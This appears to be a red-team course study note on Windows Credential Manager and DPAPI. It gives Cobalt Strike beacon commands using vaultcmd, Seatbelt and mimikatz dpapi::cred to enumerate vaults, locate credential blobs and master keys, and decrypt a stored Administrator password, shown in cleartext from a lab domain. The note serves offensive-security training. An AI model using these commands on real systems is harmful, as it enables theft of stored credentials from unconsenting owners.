Used by Windows [[DPAPI]]

Composed of two elements: Vault, Credentials.
Credentials are also called "encrypted blobs".

## 📔 Credentials

A "credential" is the actual encrypted credential blob.
 
## 🖊️ Vaults

A "vault" essentially holds records of encrypted credentials and a reference to the encrypted blobs.  Windows has two vaults: Web Credentials (for storing browser credentials) and Windows Credentials (for storing credentials saved by mstsc, etc).

To enumerate a user's vaults, you can use the native `vaultcmd` tool via [[Cobalt Strike]]:

```
beacon> run vaultcmd /list

Currently loaded vaults:
	Vault: Web Credentials
	Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
	Location: C:\Users\bfarmer\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

	Vault: Windows Credentials
	Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
	Location: C:\Users\bfarmer\AppData\Local\Microsoft\Vault

beacon> run vaultcmd /listcreds:"Windows Credentials" /all

Credentials in vault: Windows Credentials

Credential schema: Windows Domain Password Credential
Resource: Domain:target=TERMSRV/sql-2.dev.cyberbotic.io
Identity: SQL-2\Administrator
Hidden: No
Roaming: No
Property (schema element id,value): (100,2)
```

#### Seatbelt

Another way to list vault's innformation is to use [[Seatbelt]] with the `-group=user` parameter, or more specifically, the `WindowsVault` parameter.

`beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault`

- Check for stored passwords in their location (credentials folder):

```
beacon> ls C:\Users\bfarmer\AppData\Local\Microsoft\Credentials
[*] Listing: C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 468b     fil     09/06/2022 10:34:22   6C33AC85D0C4DCEAB186B3B2E5B1AC7C
 10kb     fil     08/30/2022 08:42:59   DFBE70A7E5CC19A398EBF1B96859CE5D

```

- Seatbelt can also enumerate them using the `WindowsCredentialFiles` parameter.
```
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsCredentialFiles
```

Seatbelt also provides the GUID of the master key used to encrypt the credentials.  The master keys are stored in the users' roaming "Protect" directory. They're also encrypted.

`beacon> ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104`

### 📔 decrypt Master Key

We must decrypt the master key first to obtain the actual AES128/256 encryption key, and then use that key to decrypt the credential blob.

- [[Decrypt Credential Manager Elevated Shell]]
- [[Decrypt Credential Manager Non-Elevated Shell]]

### 📔 decrypt credential blob

Once you obtain the master key decrypted, you can do:

```
beacon> mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\6C33AC85D0C4DCEAB186B3B2E5B1AC7C /masterkey:8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214

  TargetName     : Domain:target=TERMSRV/sql-2.dev.cyberbotic.io
  UserName       : SQL-2\Administrator
  CredentialBlob : wIfY&cZ&d?QP9iMFEzckmj.34=@sg.*i
```


### ⚠ Opsec




### Properties
---
📆 created   {{18-02-2024}} 11:46
🏷️ tags: #redteam #crto 

---

